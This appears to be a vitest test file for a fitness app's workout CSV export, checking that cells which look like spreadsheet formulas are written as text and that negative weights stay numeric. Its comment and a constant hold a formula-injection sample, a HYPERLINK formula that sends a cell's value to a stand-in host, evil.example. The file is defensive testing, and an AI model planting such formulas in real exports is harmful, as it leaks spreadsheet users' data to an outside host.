/**
 * THE WORKOUT EXPORT WRITES NO CELL A SPREADSHEET WOULD RUN.
 *
 * Found next to the Time fix of 2026-11-04 (heavy-user audit D3): `workoutsToCsv` had
 * its own cell writer, which quoted commas and quotes and nothing else, so a session
 * note reading `=HYPERLINK("http://evil.example/?x="&A1,"Click me")` opened in a
 * spreadsheet as a live formula. It now writes every cell with the app's one CSV cell,
 * `csvCell` in `src/shared/csvCell.ts`, which Time's report exports use too.
 */

import { describe, expect, it } from "vitest"

import { workoutsToCsv } from "@/src/health/healthService"
import type { WorkoutLogWithSets, WorkoutSetRow } from "@/src/health/types"
import { parseCsvRows } from "@/src/timetrack/importExportService"

const TZ = "Europe/Copenhagen"
const FORMULA = '=HYPERLINK("http://evil.example/?x="&A1,"Click me")'

function session(notes: string, exercise: string): WorkoutLogWithSets {
  const at = "2026-03-01T10:00:00.000Z"
  const set: WorkoutSetRow = {
    id: "s1",
    log_id: "l1",
    exercise,
    weight_kg: -2.5,
    reps: 5,
    set_number: 1,
    notes: null,
    exercise_notes: null,
    exercise_id: null,
    library_id: null,
    set_kind: "working",
    prescribed_index: null,
    completed_at: null,
    rpe: null,
    side: null,
  }
  return {
    id: "l1",
    user_id: "u1",
    session_type: "weights",
    duration_min: 60,
    intensity: 3,
    distance_km: null,
    logged_at: at,
    created_at: at,
    started_at: null,
    ended_at: null,
    enrollment_id: null,
    program_day_id: null,
    program_cycle: null,
    program_week: null,
    adjustments: {},
    rpe: null,
    notes,
    client_key: null,
    sets: [set],
  }
}

describe("the workout export", () => {
  it("writes a note or an exercise that looks like a formula as text", () => {
    const csv = workoutsToCsv([session(FORMULA, "@SUM(A1:A9)"), session("+1 rep;=cmd", "-bench")], TZ)
    const cells = parseCsvRows(csv).flat()

    expect(cells.filter((cell) => /^\s*[=+\-@\t\r]/.test(cell) && !/^-?\d+(\.\d+)?$/.test(cell)), "these cells start a formula").toEqual([])
    expect(cells).toContain(`'${FORMULA}`)
    expect(cells).toContain("'@SUM(A1:A9)")
  })

  it("leaves numbers as numbers, a negative one included", () => {
    const row = parseCsvRows(workoutsToCsv([session("fine", "Squat")], TZ))[1]
    // assisted lifts are logged as negative weight: still a number to the spreadsheet
    expect(row[8]).toBe("-2.5")
    expect(row[2]).toBe("60")
  })
})
